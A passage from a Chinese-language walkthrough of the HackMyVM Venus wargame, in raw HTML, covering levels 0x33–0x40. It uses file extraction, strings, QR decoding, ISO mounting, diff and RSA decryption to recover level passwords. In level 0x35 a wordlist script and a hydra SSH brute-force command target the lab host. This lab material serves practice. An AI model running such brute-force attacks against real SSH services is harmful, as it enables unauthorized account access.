number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> lana lana   <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> lana lana  <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> lana lana   <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root lana    <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root lana   <span class=\"token number\">161</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root lana <span class=\"token number\">10240</span> Apr  <span class=\"token number\">7</span> 06:00 zip.gz</pre></td></tr></table></figure><p>这里的文件 &quot;zip.gz&quot; 特别引人注目。使用 file 命令我们可以找出它是什么类型的文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file</span> zip.gz</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>zip.gz: POSIX <span class=\"token function\">tar</span> archive <span class=\"token punctuation\">(</span>GNU<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>正如预期的那样，这是一个 tar 存档。由于我们在当前目录中只有读取权限，我们在 '/tmp' 文件夹中创建一个新目录并直接在那里解压存档：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> /tmp/zip</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">tar</span> <span class=\"token parameter variable\">-xf</span> zip.gz <span class=\"token parameter variable\">-C</span> /tmp/zip</pre></td></tr></table></figure><p>让我们看看现在新创建的目录中有什么：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span> /tmp/zip</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-xr-x  <span class=\"token number\">3</span> lana lana  <span class=\"token number\">60</span> Apr <span class=\"token number\">27</span> 06:36 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-x-wx <span class=\"token number\">12</span> root root <span class=\"token number\">380</span> Apr <span class=\"token number\">27</span> 06:33 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>drwxr-xr-x  <span class=\"token number\">3</span> lana lana  <span class=\"token number\">60</span> Apr <span class=\"token number\">27</span> 06:36 pwned</pre></td></tr></table></figure><p>已经创建了一个新目录 &quot;pwned&quot;。那里有什么？</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span> /tmp/zip/pwned</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-xr-x <span class=\"token number\">3</span> lana lana <span class=\"token number\">60</span> Apr <span class=\"token number\">27</span> 06:36 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">3</span> lana lana <span class=\"token number\">60</span> Apr <span class=\"token number\">27</span> 06:36 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>drwxr-xr-x <span class=\"token number\">2</span> lana lana <span class=\"token number\">60</span> Apr <span class=\"token number\">27</span> 06:36 lana</pre></td></tr></table></figure><p>另一个目录。这一次的名字是 'lana'。然后我们也进去看看：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span> /tmp/zip/pwned/lana</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-xr-x <span class=\"token number\">2</span> lana lana <span class=\"token number\">60</span> Apr <span class=\"token number\">27</span> 06:36 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">3</span> lana lana <span class=\"token number\">60</span> Apr <span class=\"token number\">27</span> 06:36 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> lana lana <span class=\"token number\">16</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token function\">zip</span></pre></td></tr></table></figure><p>在这里，我们找到了一个名为 &quot;zip&quot; 的文件。使用 cat 我们输出文件的内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /tmp/zip/pwned/lana/zip</pre></td></tr></table></figure><p>这样我们就有了下一级的密码。</p>\n<h2 id=\"0x34\"><a class=\"anchor\" href=\"#0x34\">#</a> 0x34</h2>\n<blockquote>\n<p>Mission: The password of maia is surrounded by trash</p>\n</blockquote>\n<p>根据提示，maia 的密码被 trash 包围。让我们看看我们可以找到什么样的文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>la <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> noa  noa   <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> noa  noa  <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> noa  noa   <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root noa    <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root noa   <span class=\"token number\">159</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root noa  <span class=\"token number\">3818</span> Apr  <span class=\"token number\">7</span> 06:00 trash</pre></td></tr></table></figure><p>有一个名为 &quot;trash&quot; 的可疑文件。使用 <code>file</code>  命令我们可以找出它是什么类型的文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file</span> trash</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>trash: PGP Secret Key -</pre></td></tr></table></figure><p>所以它是一个 PGP 密钥。你不希望在那里找到字符串。所以我们尝试这样做：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>strings trash</pre></td></tr></table></figure><p>作为对这一大胆尝试的奖励，我们获得了下一级的密码。</p>\n<h2 id=\"0x35\"><a class=\"anchor\" href=\"#0x35\">#</a> 0x35</h2>\n<blockquote>\n<p>Mission: The user gloria has forgotten the last 2 characters of her password … They only remember that they were 2 lowercase letters.</p>\n</blockquote>\n<p>在这个级别中，目标是暴力破解密码的最后两位数字以进入下一个级别。我们还得到有用的提示，它是两个小写字母的问题。因此，我们有 26×26 种可能的组合。</p>\n<p>首先我们打印出密码的已知部分：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root maia <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root root <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> maia maia  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> maia maia <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> maia maia  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root maia   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root maia   <span class=\"token number\">16</span> Apr  <span class=\"token number\">7</span> 06:00 forget</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root maia  <span class=\"token number\">317</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">cat</span> forget</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>v7xUVE2e5bjUc??</pre></td></tr></table></figure><p>在第二步中，我们编写了一个小的 Python 脚本，它将所有可能的组合写入本地文件 &quot;pass.txt&quot;：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>prefix <span class=\"token operator\">=</span> <span class=\"token string\">\"v7xUVE2e5bjUc\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>lower <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_lowercase</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pass.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> password<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> lower<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> lower<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      password<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>prefix<span class=\"token operator\">+</span>i<span class=\"token operator\">+</span>j<span class=\"token operator\">+</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有了这个文件和命令行工具 <code>hydra</code> ，我们现在开始暴力攻击：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>hydra <span class=\"token parameter variable\">-l</span> gloria <span class=\"token parameter variable\">-P</span> pass.txt ssh://venus.hackmyvm.eu:5000</pre></td></tr></table></figure><p>由于可能的组合数量相对较少（最多 676 次尝试）， <code>hydra</code>  因此可以相当快地为我们提供下一个级别的密码。</p>\n<h2 id=\"0x36\"><a class=\"anchor\" href=\"#0x36\">#</a> 0x36</h2>\n<blockquote>\n<p>Mission: User alora likes drawings, that's why she saved her password as …</p>\n</blockquote>\n<p>所以 alora 喜欢画画，显然她的密码也是这样保存的。让我们看看我们可以找到哪些文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root   gloria <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root   root   <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> gloria gloria  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> gloria gloria <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> gloria gloria  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root   gloria   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root   gloria <span class=\"token number\">1713</span> Apr  <span class=\"token number\">7</span> 06:00 image</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root   gloria  <span class=\"token number\">222</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">file</span> image</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>image: ASCII text</pre></td></tr></table></figure><p>有一个名为 &quot;image&quot; 的文件，但如果我们查看它是什么类型的文件，我们会发现它是一个文本文件。那么我们来看看内容：</p>\n<pre><code>cat image\n</code></pre>\n<p>这是一个二维码。试图用手机扫描它，但它不起作用。创建一个小的 Python 脚本来让 QR 码更 &quot;可读&quot;（当然，你也可以使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv\"> CyberChef</span> 中的功能） ：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> img<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  lines <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">for</span> l <span class=\"token keyword\">in</span> lines<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'#'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x2588</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>优化后手机能认出了这个二维码，并显示了密码。</p>\n<h2 id=\"0x37\"><a class=\"anchor\" href=\"#0x37\">#</a> 0x37</h2>\n<blockquote>\n<p>Mission: User Julie has created an iso with her password.</p>\n</blockquote>\n<p>下一级的密码在 ISO 映像中</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  alora   <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root    <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> alora alora    <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> alora alora   <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> alora alora    <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  alora     <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  alora    <span class=\"token number\">172</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  alora <span class=\"token number\">360448</span> Apr  <span class=\"token number\">7</span> 06:00 music.iso</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">file</span> music.iso</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>music.iso: ISO <span class=\"token number\">9660</span> CD-ROM filesystem data <span class=\"token string\">'CDROM'</span></pre></td></tr></table></figure><p>首先，我们将文件 &quot;music.iso&quot; 下载 scp 到当前目录：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">scp</span> <span class=\"token parameter variable\">-P</span> <span class=\"token number\">5000</span> alora@venus.hackmyvm.eu:/pwned/alora/music.iso ./</pre></td></tr></table></figure><p>现在我们在挂载 ISO 文件的 &quot;/media&quot; 文件夹中创建一个名为 &quot;iso&quot; 的新目录：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mkdir</span> /media/iso</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">mount</span> <span class=\"token parameter variable\">-o</span> loop ./music.iso /media/iso</pre></td></tr></table></figure><p>现在我们显示这个目录的内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span> /media/iso</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>-r--r--r-- <span class=\"token number\">1</span> root root <span class=\"token number\">208</span> Apr  <span class=\"token number\">7</span> 07:00 music.zip</pre></td></tr></table></figure><p>将文件解压缩到当前目录中：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">unzip</span> music.zip <span class=\"token parameter variable\">-d</span> ./</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Archive:  music.zip</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> extracting: pwned/alora/music.txt</pre></td></tr></table></figure><p>现在我们可以查看 'pwned/alora/music.txt' 的内容并获得下一级的密码。但是我们仍然需要弹出挂载的镜像并删除为它创建的目录：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> pwned/alora/music.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">umount</span> /media/iso</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">rm</span> <span class=\"token parameter variable\">-r</span> /mdeia/iso</pre></td></tr></table></figure><h2 id=\"0x38\"><a class=\"anchor\" href=\"#0x38\">#</a> 0x38</h2>\n<blockquote>\n<p>Mission: The user irene believes that the beauty is in the difference.</p>\n</blockquote>\n<p>这个级别是关于比较两个文件并找出两个文件的差异。那么让我们先看看我们有哪些文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  julie <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> julie julie  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> julie julie <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> julie julie  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  julie <span class=\"token number\">4802</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token number\">1</span>.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  julie <span class=\"token number\">4802</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token number\">2</span>.txt</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  julie   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  julie  <span class=\"token number\">192</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr></table></figure><p>很明显，我们应该比较文件 &quot;1.txt&quot; 和 &quot;2.txt&quot;。幸运的是，Linux 提供了一个命令行工具来实现这个目的：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">diff</span> <span class=\"token number\">1</span>.txt <span class=\"token number\">2</span>.txt</pre></td></tr></table></figure><p>该命令返回给我们两个不同的字符串。其中之一是下一级的密码。</p>\n<h2 id=\"0x39\"><a class=\"anchor\" href=\"#0x39\">#</a> 0x39</h2>\n<blockquote>\n<p>Mission: The user adela has lent her password to irene.</p>\n</blockquote>\n<p>这个有点神秘的任务文本给我们一点线索来了解这个级别的任务是什么。那么让我们先看看我们有哪些文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  irene <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> irene irene  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> irene irene <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> irene irene  <span class=\"token number\">807</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .profile</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  irene   <span class=\"token number\">31</span> Apr  <span class=\"token number\">7</span> 05:55 flagz.txt</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  irene <span class=\"token number\">1679</span> Apr  <span class=\"token number\">7</span> 06:00 id_rsa.pem</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  irene  <span class=\"token number\">451</span> Apr  <span class=\"token number\">7</span> 06:00 id_rsa.pub</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  irene  <span class=\"token number\">178</span> Apr  <span class=\"token number\">7</span> 05:55 mission.txt</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>-rw-r----- <span class=\"token number\">1</span> root  irene  <span class=\"token number\">256</span> Apr  <span class=\"token number\">7</span> 06:00 pass.enc</pre></td></tr></table></figure><p>我们有一个公钥和一个私钥 RSA 密钥和一个文件 &quot;pass.enc&quot;。所以很明显，下一级的密码是在文件 'pass.enc' 中进行 RSA 加密的。所以我们使用该工具 openssl 使用私钥解密这个文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>openssl rsautl <span class=\"token parameter variable\">-decrypt</span> <span class=\"token parameter variable\">-inkey</span> id_rsa.pem <span class=\"token parameter variable\">-in</span> pass.enc</pre></td></tr></table></figure><p>0x40 的密码被解密。</p>\n<h2 id=\"0x40\"><a class=\"anchor\" href=\"#0x40\">#</a> 0x40</h2>\n<blockquote>\n<p>MIssion: User sky has saved her password to something that can be listened to.</p>\n</blockquote>\n<p>这个级别的任务文本也很神秘。那么让我们先看看我们有哪些文件：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>la <span class=\"token parameter variable\">-la</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>drwxr-x--- <span class=\"token number\">2</span> root  adela <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 06:00 <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>drwxr-xr-x <span class=\"token number\">1</span> root  root  <span class=\"token number\">4096</span> Apr  <span class=\"token number\">7</span> 05:55 <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> adela adela  <span class=\"token number\">220</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bash_logout</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-rw-r--r-- <span class=\"token number\">1</span> adela adela <span class=\"token number\">3526</span> Aug  <span class=\"token number\">4</span>  <span class=\"token number\">2021</span> .bashrc</pre></td></tr><tr><td 